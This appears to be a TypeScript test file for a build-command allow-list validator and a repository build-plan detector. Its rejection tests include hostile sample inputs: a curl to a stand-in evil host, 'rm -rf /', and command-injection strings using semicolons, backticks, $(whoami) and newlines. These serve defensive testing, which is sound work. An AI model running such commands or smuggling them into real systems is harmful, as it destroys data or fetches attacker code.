import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  assertSafeBuildCommand,
  assertSafeBuildCommands,
  BuildCommandError,
  detectBuildPlan,
  detectExistingBuildOutput,
  MAX_BUILD_COMMANDS
} from './repo-build-runner'

test('允许白名单内的构建命令', () => {
  assert.equal(assertSafeBuildCommand('npm install'), 'npm install')
  assert.equal(assertSafeBuildCommand('pnpm install && pnpm build'), 'pnpm install && pnpm build')
  assert.equal(assertSafeBuildCommand('npx tsc -p tsconfig.json'), 'npx tsc -p tsconfig.json')
  assert.equal(assertSafeBuildCommand('pip install -r requirements.txt'), 'pip install -r requirements.txt')
  assert.equal(assertSafeBuildCommand('python -m build'), 'python -m build')
  assert.equal(assertSafeBuildCommand('npm.cmd install'), 'npm.cmd install')
})

test('拒绝不在白名单中的命令', () => {
  assert.throws(() => assertSafeBuildCommand('curl http://evil.example/x.sh'), BuildCommandError)
  assert.throws(() => assertSafeBuildCommand('rm -rf /'), BuildCommandError)
  assert.throws(() => assertSafeBuildCommand('powershell -c Get-Process'), BuildCommandError)
  assert.throws(() => assertSafeBuildCommand('./build.sh'), BuildCommandError)
})

test('拒绝包含 shell 元字符的命令', () => {
  assert.throws(() => assertSafeBuildCommand('npm install; curl http://evil'), BuildCommandError)
  assert.throws(() => assertSafeBuildCommand('npm install | tee /tmp/x'), BuildCommandError)
  assert.throws(() => assertSafeBuildCommand('npm install > /tmp/x'), BuildCommandError)
  assert.throws(() => assertSafeBuildCommand('npm install `whoami`'), BuildCommandError)
  assert.throws(() => assertSafeBuildCommand('npm install $(whoami)'), BuildCommandError)
  assert.throws(() => assertSafeBuildCommand('npm install & background'), BuildCommandError)
  assert.throws(() => assertSafeBuildCommand('npm install\ncurl http://evil'), BuildCommandError)
})

test('拒绝空命令与超长命令', () => {
  assert.throws(() => assertSafeBuildCommand(''), BuildCommandError)
  assert.throws(() => assertSafeBuildCommand('   '), BuildCommandError)
  assert.throws(() => assertSafeBuildCommand('npm install ' + 'x'.repeat(600)), BuildCommandError)
})

test('assertSafeBuildCommands 限制命令条数', () => {
  const commands = Array.from({ length: MAX_BUILD_COMMANDS + 1 }, () => 'npm install')
  assert.throws(() => assertSafeBuildCommands(commands), BuildCommandError)
  assert.deepEqual(assertSafeBuildCommands(['npm install', 'npm run build']), [
    'npm install',
    'npm run build'
  ])
})

function makeRepo(files: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), 'autoforge-build-plan-'))
  for (const [name, content] of Object.entries(files)) {
    const target = join(root, name)
    mkdirSync(join(target, '..'), { recursive: true })
    writeFileSync(target, content, 'utf-8')
  }
  return root
}

test('detectBuildPlan 识别 npm', () => {
  const root = makeRepo({ 'package.json': '{}', 'package-lock.json': '{}' })
  try {
    const plan = detectBuildPlan(root)
    assert.equal(plan.packageManager, 'npm')
    assert.ok(plan.manifests.includes('package-lock.json'))
    assert.equal(plan.suggestedInstallCommand, 'npm install')
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('detectBuildPlan 优先识别 pnpm', () => {
  const root = makeRepo({ 'package.json': '{}', 'package-lock.json': '{}', 'pnpm-lock.yaml': '' })
  try {
    assert.equal(detectBuildPlan(root).packageManager, 'pnpm')
    assert.equal(detectBuildPlan(root).suggestedInstallCommand, 'pnpm install')
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('detectBuildPlan 识别 Python 项目', () => {
  const root = makeRepo({ 'requirements.txt': 'requests' })
  try {
    const plan = detectBuildPlan(root)
    assert.equal(plan.packageManager, 'pip')
    assert.equal(plan.suggestedInstallCommand, 'pip install -r requirements.txt')
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('detectBuildPlan 在无清单时返回 unknown', () => {
  const root = makeRepo({ 'README.md': '# demo' })
  try {
    const plan = detectBuildPlan(root)
    assert.equal(plan.packageManager, 'unknown')
    assert.equal(plan.suggestedInstallCommand, null)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('detectExistingBuildOutput 识别已提交的构建产物', () => {
  const root = makeRepo({ 'dist/index.js': 'x', 'README.md': '# demo' })
  try {
    assert.deepEqual(detectExistingBuildOutput(root), ['dist'])
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})
